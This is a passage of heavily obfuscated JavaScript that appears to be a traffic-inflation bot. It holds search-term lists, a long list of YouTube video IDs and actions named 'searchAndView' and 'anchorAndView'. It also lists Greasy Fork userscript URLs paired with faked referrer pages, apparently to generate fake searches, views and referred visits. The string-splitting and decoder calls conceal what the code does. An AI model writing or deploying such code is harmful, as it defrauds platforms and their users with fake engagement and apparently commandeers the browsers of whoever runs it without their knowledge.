'\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + Z(0x1c) + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x383 * -0x3 + 0x71 * 0x12 + -0x1 * -0x2a1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0xb * -0x1b9 + -0x76e + -0xb7b * 0x1)), searchTerms['push'](('bts,bts\x20v,' + a0(0xf, 'L(Jp') + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x2071 + 0x1fe7 + -0x1 * 0x4055);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    a0(0x6, 'pe5k') + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0xb, 'B8Ki') + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': a0(0x16, 'AcD3') + 'easyfork.o' + a1(0x8) + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x4)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': a1(0x11) + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
